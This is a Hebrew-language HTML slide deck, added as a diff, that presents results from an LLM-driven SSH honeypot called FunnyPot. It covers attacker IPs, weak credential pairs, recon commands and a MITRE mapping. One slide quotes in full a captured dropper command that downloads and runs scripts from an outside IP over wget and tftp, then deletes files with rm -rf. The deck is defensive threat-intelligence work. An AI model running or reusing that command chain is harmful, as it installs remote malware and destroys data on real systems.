@@ -1,0 +1,417 @@
+<!doctype html>
+<html lang="he" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>FunnyPot - מצגת מוצר ותוצאות</title>
+  <style>
+    :root {
+      --bg: #061015;
+      --panel: #111b25;
+      --panel2: #162331;
+      --text: #eef7ff;
+      --muted: #9fb0c2;
+      --cyan: #35e6f2;
+      --green: #56f39a;
+      --amber: #ffc857;
+      --red: #ff6f91;
+      --purple: #9e7bff;
+      --line: rgba(255,255,255,.12);
+    }
+
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      background:
+        radial-gradient(circle at 18% 8%, rgba(53,230,242,.22), transparent 30%),
+        radial-gradient(circle at 80% 20%, rgba(158,123,255,.16), transparent 34%),
+        linear-gradient(135deg, #061015 0%, #091923 55%, #0d1a15 100%);
+      color: var(--text);
+      font-family: "Segoe UI", Arial, sans-serif;
+      line-height: 1.45;
+    }
+
+    .deck { max-width: 1180px; margin: 0 auto; padding: 28px; }
+    .slide {
+      min-height: 720px;
+      margin: 0 0 28px;
+      padding: 48px;
+      border: 1px solid var(--line);
+      border-radius: 34px;
+      background: linear-gradient(160deg, rgba(17,27,37,.96), rgba(12,22,31,.92));
+      box-shadow: 0 24px 80px rgba(0,0,0,.38), inset 0 1px 0 rgba(255,255,255,.06);
+      position: relative;
+      overflow: hidden;
+    }
+    .slide::before {
+      content: "";
+      position: absolute;
+      inset: -60px auto auto -60px;
+      width: 260px;
+      height: 260px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(53,230,242,.18), transparent 70%);
+      pointer-events: none;
+    }
+
+    h1, h2, h3 { margin: 0; letter-spacing: -.03em; }
+    h1 { font-size: 74px; line-height: 1.02; }
+    h2 { font-size: 46px; margin-bottom: 24px; }
+    h3 { font-size: 24px; color: var(--cyan); margin-bottom: 12px; }
+    p { color: var(--muted); font-size: 22px; margin: 14px 0; }
+    .lead { font-size: 28px; color: #d9faff; max-width: 840px; }
+    .kicker { color: var(--cyan); font-weight: 800; letter-spacing: .14em; text-transform: uppercase; margin-bottom: 18px; }
+    .tagline { display: inline-block; margin-top: 22px; padding: 10px 18px; border: 1px solid rgba(53,230,242,.35); border-radius: 999px; color: var(--cyan); background: rgba(53,230,242,.08); }
+
+    .grid { display: grid; gap: 18px; }
+    .grid-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+    .grid-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+    .grid-4 { grid-template-columns: repeat(4, minmax(0, 1fr)); }
+    .card {
+      padding: 22px;
+      border: 1px solid var(--line);
+      border-radius: 22px;
+      background: rgba(255,255,255,.045);
+    }
+    .metric .num { font-size: 46px; font-weight: 900; color: var(--text); direction: ltr; text-align: right; }
+    .metric .label { color: var(--muted); font-size: 18px; margin-top: 4px; }
+    .metric.cyan .num { color: var(--cyan); }
+    .metric.green .num { color: var(--green); }
+    .metric.amber .num { color: var(--amber); }
+    .metric.red .num { color: var(--red); }
+
+    ul { margin: 10px 0 0; padding: 0 22px 0 0; }
+    li { margin: 10px 0; font-size: 21px; color: #dbe7f2; }
+    .muted { color: var(--muted); }
+    .accent { color: var(--cyan); font-weight: 800; }
+    .good { color: var(--green); font-weight: 800; }
+    .warn { color: var(--amber); font-weight: 800; }
+    .bad { color: var(--red); font-weight: 800; }
+
+    .bar-list { display: grid; gap: 12px; }
+    .bar-row { display: grid; grid-template-columns: 190px 1fr 54px; gap: 12px; align-items: center; }
+    .bar-label { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: #e9f6ff; direction: ltr; text-align: left; }
+    .bar-track { height: 16px; border-radius: 999px; background: rgba(255,255,255,.08); overflow: hidden; }
+    .bar { height: 100%; border-radius: inherit; background: linear-gradient(90deg, var(--cyan), var(--green)); }
+    .bar.amber { background: linear-gradient(90deg, var(--amber), #ff8f5f); }
+    .bar.purple { background: linear-gradient(90deg, var(--purple), var(--cyan)); }
+    .bar-value { color: var(--muted); font-weight: 700; direction: ltr; text-align: left; }
+
+    .flow { display: grid; grid-template-columns: repeat(5, 1fr); gap: 14px; align-items: stretch; margin-top: 22px; }
+    .step { padding: 18px; border-radius: 20px; background: rgba(53,230,242,.08); border: 1px solid rgba(53,230,242,.22); }
+    .step strong { display: block; font-size: 21px; color: var(--cyan); margin-bottom: 8px; }
+    .step span { color: var(--muted); font-size: 17px; }
+
+    .command-box {
+      direction: ltr;
+      text-align: left;
+      font-family: ui-monospace, SFMono-Regular, Consolas, "Liberation Mono", monospace;
+      white-space: pre-wrap;
+      font-size: 18px;
+      padding: 16px;
+      border-radius: 18px;
+      background: #061019;
+      border: 1px solid rgba(53,230,242,.16);
+      color: #ecfbff;
+    }
+    .pill-row { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 16px; }
+    .pill { padding: 9px 13px; border-radius: 999px; background: rgba(255,255,255,.07); border: 1px solid var(--line); color: #dcecff; font-weight: 700; }
+
+    .footer {
+      position: absolute;
+      bottom: 24px;
+      left: 42px;
+      right: 42px;
+      display: flex;
+      justify-content: space-between;
+      color: rgba(255,255,255,.45);
+      font-size: 14px;
+      direction: ltr;
+    }
+
+    @media print {
+      body { background: #061015; }
+      .deck { padding: 0; max-width: none; }
+      .slide { min-height: 100vh; margin: 0; border-radius: 0; page-break-after: always; box-shadow: none; }
+    }
+  </style>
+</head>
+<body>
+  <main class="deck">
+    <section class="slide">
+      <div class="kicker">FunnyPot SSH Honeypot</div>
+      <h1>מלכודת SSH חכמה שמתרגמת תקיפות לתובנות</h1>
+      <p class="lead">המוצר מדמה שרת Linux רגיש באמצעות LLM, קולט תוקפים אמיתיים, מתעד אישורים, פקודות, Payloads והתנהגות, ומפרסם דאשבורד סטטי לניתוח TTP.</p>
+      <div class="tagline">נתונים עד 24/05/2026 13:45 UTC</div>
+      <div class="grid grid-4" style="margin-top:46px">
+        <div class="card metric cyan"><div class="num">2,298</div><div class="label">אירועים שנאספו</div></div>
+        <div class="card metric green"><div class="num">437</div><div class="label">ניסיונות הזדהות</div></div>
+        <div class="card metric amber"><div class="num">48</div><div class="label">Shell sessions</div></div>
+        <div class="card metric red"><div class="num">29</div><div class="label">כתובות IP ייחודיות</div></div>
+      </div>
+      <div class="footer"><span>FunnyPot.ai</span><span>Product & Threat Intelligence Deck</span></div>
+    </section>
+
+    <section class="slide">
+      <h2>מה המוצר עושה?</h2>
+      <div class="grid grid-2">
+        <div class="card">
+          <h3>חוויית שרת אמינה לתוקף</h3>
+          <p>המערכת מציגה Banner, תהליך Auth ו־Shell שמדמים סביבת Linux מיושנת ובעלת ערך, כולל קבצים רגישים מדומים ותגובות Bash.</p>
+        </div>
+        <div class="card">
+          <h3>LLM כמנוע סימולציה</h3>
+          <p>פקודות מורכבות עוברות ל־LLM כדי לאפשר אינטראקציה עשירה יותר ממאגר תגובות סטטי, כולל צינורות, redirection ו־payload chains.</p>
+        </div>
+        <div class="card">
+          <h3>איסוף מודיעין התנהגותי</h3>
+          <p>המערכת מודדת latency בין פקודות, עומק Discovery, AVP, MITRE ATT&CK, יחס שגיאות, Payload URLs ויעדי Egress.</p>
+        </div>
+        <div class="card">
+          <h3>פרסום לדשבורד סטטי</h3>
+          <p>אירועים נכתבים ל־JSONL, מסוכמים ל־harvest_summary, ומפורסמים לדשבורד GitHub Pages לצפייה מהירה ובטוחה.</p>
+        </div>
+      </div>
+      <div class="flow">
+        <div class="step"><strong>1. חיבור</strong><span>סריקה או SSH login</span></div>
+        <div class="step"><strong>2. Harvest</strong><span>איסוף user/pass ו־metadata</span></div>
+        <div class="step"><strong>3. Shell</strong><span>סביבה אינטראקטיבית מדומה</span></div>
+        <div class="step"><strong>4. ניתוח</strong><span>פקודות, Payloads, TTP</span></div>
+        <div class="step"><strong>5. פרסום</strong><span>דשבורד ו־session logs</span></div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>תמונת מצב כמותית</h2>
+      <div class="grid grid-4">
+        <div class="card metric cyan"><div class="num">616</div><div class="label">TCP/SSH sessions</div></div>
+        <div class="card metric green"><div class="num">437</div><div class="label">Credentials harvested</div></div>
+        <div class="card metric amber"><div class="num">48</div><div class="label">פקודות תוקף</div></div>
+        <div class="card metric red"><div class="num">46</div><div class="label">תוצאות פקודה</div></div>
+      </div>
+      <div class="grid grid-2" style="margin-top:22px">
+        <div class="card">
+          <h3>פרשנות</h3>
+          <ul>
+            <li>רוב הפעילות היא <span class="accent">Credential spraying</span>: הרבה ניסיונות Login, מעט Shells.</li>
+            <li>48 Shells מתוך 437 ניסיונות Auth מצביעים על כך שה־harvest threshold נותן מספיק גישה כדי ללמוד התנהגות אחרי פריצה.</li>
+            <li>46 תוצאות מתוך 48 פקודות מעידות על כיסוי טוב, אך קיימות שתי פקודות ללא Result מלא שדורשות ניטור המשך.</li>
+          </ul>
+        </div>
+        <div class="card">
+          <h3>מדדי איכות אינטראקציה</h3>
+          <ul>
+            <li>זמן תגובה ממוצע: <span class="good">2,531ms</span> - סביר ל־LLM, אך Static responses מורידים median ל־0ms.</li>
+            <li>שגיאות: <span class="warn">10 מתוך 46</span> תוצאות - בעיקר סימן לסקריפטים עיוורים/פקודות לא מותאמות.</li>
+            <li>AVP ממוצע נמוך 1.9, מקסימום 18 - רוב הפעילות בסיסית, עם כמה ניסיונות Payload משמעותיים.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>משפך תקיפה</h2>
+      <div class="grid grid-3">
+        <div class="card metric cyan"><div class="num">437</div><div class="label">ניסיונות Login</div></div>
+        <div class="card metric green"><div class="num">48</div><div class="label">Shell נפתחו</div></div>
+        <div class="card metric amber"><div class="num">5</div><div class="label">ניסיונות Payload/Binary</div></div>
+      </div>
+      <div class="card" style="margin-top:24px">
+        <h3>פרשנות שלי</h3>
+        <p>היחס בין ניסיונות הזדהות ל־Shells מראה תמהיל קלאסי של בוטים: הרבה רעש בסיסי, ואז מספר קטן של Sessions שמריצים Recon או Dropper. הדבר החשוב הוא לא רק כמה תוקפים נכנסו, אלא כמה מהם עברו מ־Login ל־Execution. כאן רואים 5 פקודות הורדת Payload, כלומר כ־10% מה־Shells הגיעו לכוונת הרצה ממשית.</p>
+      </div>
+      <div class="pill-row">
+        <span class="pill">Attack funnel</span>
+        <span class="pill">Credential spraying</span>
+        <span class="pill">Post-auth behavior</span>
+        <span class="pill">Payload acquisition</span>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>מקורות תקיפה מובילים</h2>
+      <div class="grid grid-2">
+        <div class="card">
+          <h3>Top IPs לפי ניסיונות</h3>
+          <div class="bar-list">
+            <div class="bar-row"><div class="bar-label">87.251.64.176</div><div class="bar-track"><div class="bar" style="width:100%"></div></div><div class="bar-value">195</div></div>
+            <div class="bar-row"><div class="bar-label">171.243.149.254</div><div class="bar-track"><div class="bar" style="width:22%"></div></div><div class="bar-value">43</div></div>
+            <div class="bar-row"><div class="bar-label">27.79.44.223</div><div class="bar-track"><div class="bar" style="width:21%"></div></div><div class="bar-value">41</div></div>
+            <div class="bar-row"><div class="bar-label">27.79.7.158</div><div class="bar-track"><div class="bar" style="width:21%"></div></div><div class="bar-value">40</div></div>
+            <div class="bar-row"><div class="bar-label">27.79.2.203</div><div class="bar-track"><div class="bar" style="width:20%"></div></div><div class="bar-value">39</div></div>
+          </div>
+        </div>
+        <div class="card">
+          <h3>תובנה</h3>
+          <p>כתובת אחת אחראית לכ־45% מכל ניסיונות ההזדהות. זה נראה כמו קמפיין אוטומטי או Scanner יחיד עם מילון קצר. קבוצה נוספת של כתובות עם Prefix דומה 27.79.x.x מצביעה על מקור אזורי/ספק דומה או רשת פרוקסי.</p>
+          <p>המשמעות למוצר: חשוב להציג גם <span class="accent">Top IP</span> וגם Cluster לפי ASN/Prefix, כי אחרת מחמיצים Campaign-level view.</p>
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>Credentials: מה התוקפים מנסים?</h2>
+      <div class="grid grid-2">
+        <div class="card">
+          <h3>שמות משתמש נפוצים</h3>
+          <div class="bar-list">
+            <div class="bar-row"><div class="bar-label">support</div><div class="bar-track"><div class="bar purple" style="width:100%"></div></div><div class="bar-value">199</div></div>
+            <div class="bar-row"><div class="bar-label">root</div><div class="bar-track"><div class="bar purple" style="width:40%"></div></div><div class="bar-value">80</div></div>
+            <div class="bar-row"><div class="bar-label">admin</div><div class="bar-track"><div class="bar purple" style="width:23%"></div></div><div class="bar-value">45</div></div>
+            <div class="bar-row"><div class="bar-label">sol</div><div class="bar-track"><div class="bar purple" style="width:5%"></div></div><div class="bar-value">9</div></div>
+            <div class="bar-row"><div class="bar-label">ubuntu</div><div class="bar-track"><div class="bar purple" style="width:3%"></div></div><div class="bar-value">6</div></div>
+          </div>
+        </div>
+        <div class="card">
+          <h3>סיסמאות נפוצות</h3>
+          <div class="bar-list">
+            <div class="bar-row"><div class="bar-label">123456789</div><div class="bar-track"><div class="bar amber" style="width:100%"></div></div><div class="bar-value">195</div></div>
+            <div class="bar-row"><div class="bar-label">admin</div><div class="bar-track"><div class="bar amber" style="width:10%"></div></div><div class="bar-value">20</div></div>
+            <div class="bar-row"><div class="bar-label">1234</div><div class="bar-track"><div class="bar amber" style="width:5%"></div></div><div class="bar-value">9</div></div>
+            <div class="bar-row"><div class="bar-label">root</div><div class="bar-track"><div class="bar amber" style="width:4%"></div></div><div class="bar-value">8</div></div>
+            <div class="bar-row"><div class="bar-label">12345</div><div class="bar-track"><div class="bar amber" style="width:4%"></div></div><div class="bar-value">7</div></div>
+          </div>
+        </div>
+      </div>
+      <div class="card" style="margin-top:22px">
+        <h3>פרשנות</h3>
+        <p>הזוגות הדומיננטיים הם Default/weak credentials. `support` + `123456789` חריגים בכמות ומרמזים על קמפיין ממוקד לציוד IoT/Network appliances, לא על תוקף ידני.</p>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>פקודות נפוצות ומה הן אומרות</h2>
+      <div class="grid grid-2">
+        <div class="card">
+          <h3>Top Commands</h3>
+          <div class="bar-list">
+            <div class="bar-row"><div class="bar-label">/bin/./uname -s -v -n -r -m</div><div class="bar-track"><div class="bar" style="width:100%"></div></div><div class="bar-value">8</div></div>
+            <div class="bar-row"><div class="bar-label">uptime -p</div><div class="bar-track"><div class="bar" style="width:100%"></div></div><div class="bar-value">8</div></div>
+            <div class="bar-row"><div class="bar-label">wget/tftp 10Gbins.sh chain</div><div class="bar-track"><div class="bar" style="width:63%"></div></div><div class="bar-value">5</div></div>
+            <div class="bar-row"><div class="bar-label">uname -s -m</div><div class="bar-track"><div class="bar" style="width:50%"></div></div><div class="bar-value">4</div></div>
+            <div class="bar-row"><div class="bar-label">lspci | grep VGA | cut ...</div><div class="bar-track"><div class="bar" style="width:38%"></div></div><div class="bar-value">3</div></div>
+          </div>
+        </div>
+        <div class="card">
+          <h3>מיפוי לכוונת תוקף</h3>
+          <ul>
+            <li><span class="accent">uname / uptime</span> - Fingerprinting: בדיקת מערכת, Kernel ו־Uptime כדי להעריך יעד.</li>
+            <li><span class="accent">lspci VGA</span> - חיפוש GPU, כנראה התאמת Miner או עומסי Compute.</li>
+            <li><span class="accent">ps | grep miner</span> - בדיקה אם כבר רץ Miner, כדי למנוע כפילות או לזהות תחרות.</li>
+            <li><span class="accent">Telegram/SMS paths</span> - חיפוש נתוני משתמש/תקשורת, אינדיקציה ל־Exfiltration opportunistic.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>פקודת Payload מרכזית</h2>
+      <div class="command-box">cd /tmp || cd /run || cd /; wget http://45.81.234.64/10Gbins.sh; chmod 777 10Gbins.sh; sh 10Gbins.sh; tftp 45.81.234.64 -c get 10Gtftp1.sh; chmod 777 10Gtftp1.sh; sh 10Gtftp1.sh; tftp -r 10Gtftp2.sh -g 45.81.234.64; chmod 777 10Gtftp2.sh; sh 10Gtftp2.sh; rm -rf 10Gbins.sh 10Gtftp1.sh 10Gtftp2.sh; rm -rf *</div>
+      <div class="grid grid-3" style="margin-top:22px">
+        <div class="card metric red"><div class="num">5</div><div class="label">חזרות על אותה שרשרת</div></div>
+        <div class="card metric amber"><div class="num">T1105</div><div class="label">Ingress Tool Transfer</div></div>
+        <div class="card metric cyan"><div class="num">1</div><div class="label">Payload URL ייחודי</div></div>
+      </div>
+      <div class="card" style="margin-top:22px">
+        <h3>פרשנות</h3>
+        <p>זו לא פקודת Recon; זו שרשרת Dropper מלאה. היא מנסה כמה ספריות כתיבה, כמה פרוטוקולי הורדה (`wget`, `tftp` בשתי צורות), נותנת הרשאות הרצה, מריצה, ואז מנקה עקבות. זו חתימה חזקה של בוט אוטומטי שמנסה להבטיח Execution גם בסביבות מינימליות.</p>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>MITRE, Payloads ו־Egress</h2>
+      <div class="grid grid-3">
+        <div class="card metric amber"><div class="num">T1105</div><div class="label">טכניקה שזוהתה</div></div>
+        <div class="card metric red"><div class="num">5</div><div class="label">Payload acquisition events</div></div>
+        <div class="card metric cyan"><div class="num">45.81.234.64</div><div class="label">תשתית Payload מרכזית</div></div>
+      </div>
+      <div class="grid grid-2" style="margin-top:22px">
+        <div class="card">
+          <h3>מה חסר כרגע במדדים?</h3>
+          <ul>
+            <li>אין אינדיקציות Persistence: כל הפקודות סווגו `none`.</li>
+            <li>אין Tunneling Intent: לא נצפו `ssh -D`, `chisel`, `frp`, `socat`.</li>
+            <li>יש יעד Egress יחיד, ולכן זה נראה כמו קמפיין ממוקד ולא פעילות מגוונת.</li>
+          </ul>
+        </div>
+        <div class="card">
+          <h3>משמעות הגנתית</h3>
+          <p>המערכת כבר מצליחה ללכוד IOC שימושי: URL, IP, פקודת הורדה, ורצף TTP. השלב הבא הוא enrichment אוטומטי ל־ASN, Geo, reputation ו־hash של payload בפועל.</p>
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>איכות הסימולציה וה־LLM</h2>
+      <div class="grid grid-2">
+        <div class="card">
+          <h3>מה עובד טוב</h3>
+          <ul>
+            <li>פקודות פשוטות מקבלות תשובה מהירה מ־static/builtin.</li>
+            <li>פקודות מורכבות עוברות ל־LLM, כולל `;`, `&&`, `||`, pipes ו־redirection.</li>
+            <li>המערכת לומדת TTPs גם כאשר ה־LLM מייצר פלט חשוד סביר, למשל Miner process.</li>
+          </ul>
+        </div>
+        <div class="card">
+          <h3>מה דורש תשומת לב</h3>
+          <ul>
+            <li>Median response 0ms מראה שהרבה פקודות עדיין קצרות דרך static path; טוב לביצועים, אך פחות עשיר מחקרית.</li>
+            <li>יש לבדוק פקודות Binary כמו `cat /bin/echo` כדי למנוע פלט לא ריאליסטי.</li>
+            <li>יחס שגיאות גבוה מדי יכול להבריח תוקף; נמוך מדי יכול להיות מלאכותי. היעד הוא איזון.</li>
+          </ul>
+        </div>
+      </div>
+      <p class="lead" style="margin-top:28px">ההחלטה המוצרית: לא להפוך את כל העולם לדטרמיניסטי. לתת ל־LLM לשחק את השרת, אבל להקיף אותו בבדיקות שמונעות Short-circuit שגוי.</p>
+    </section>
+
+    <section class="slide">
+      <h2>מסקנות עסקיות ומוצריות</h2>
+      <div class="grid grid-2">
+        <div class="card">
+          <h3>ערך ללקוח</h3>
+          <ul>
+            <li>המערכת מפיקה מודיעין אמיתי מתוקפים חיים, בלי לחשוף נכסים אמיתיים.</li>
+            <li>היא מתעדת גם את שלב ה־Credential וגם את ה־Post-exploitation.</li>
+            <li>הדשבורד מאפשר ניתוח מהיר של קמפיינים, פקודות ותשתיות.</li>
+          </ul>
+        </div>
+        <div class="card">
+          <h3>הכיוון הבא</h3>
+          <ul>
+            <li>העשרת IP/ASN/Geo ותצוגת Campaign clusters.</li>
+            <li>Sandbox או downloader בטוח ל־payload hash ו־file metadata.</li>
+            <li>Scoring משופר ל־bot vs human לפי latency, complexity ו־command progression.</li>
+            <li>Export ל־STIX/TAXII או Sigma/YARA עבור צוותי SOC.</li>
+          </ul>
+        </div>
+      </div>
+      <div class="card" style="margin-top:22px">
+        <h3>שורה תחתונה</h3>
+        <p>FunnyPot כבר מוכיח שהוא לא רק Honeypot אלא Sensor התנהגותי: הוא מזהה סריקות סיסמאות, פקודות Fingerprinting, חיפוש Miner, ושרשראות Dropper. המוצר בשל להצגה כ־Threat Intelligence Capture Platform עם התמחות ב־SSH.</p>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>נספח: הנתונים ששימשו למצגת</h2>
+      <div class="grid grid-2">
+        <div class="card">
+          <h3>מקור</h3>
+          <ul>
+            <li>`/home/test/app/frontend/data/harvest_summary.json` מתוך הקונטיינר.</li>
+            <li>`/home/test/app/frontend/data/harvest.jsonl` מתוך הקונטיינר.</li>
+            <li>חישוב פקודות נפוצות, טקטיקות ו־Payloads מתוך אירועי `command` ו־`command_result`.</li>
+          </ul>
+        </div>
+        <div class="card">
+          <h3>הערות מתודולוגיות</h3>
+          <ul>
+            <li>Binary attempts חושבו על בסיס Payload URLs, TTP, ופקודות כגון `wget`, `tftp`, `chmod`, `sh`.</li>
+            <li>מדדי שגיאה מבוססים על `FailedCommand` בתוצאות.</li>
+            <li>המצגת משקפת snapshot עד 24/05/2026 13:45 UTC.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+  </main>
+</body>
+</html>
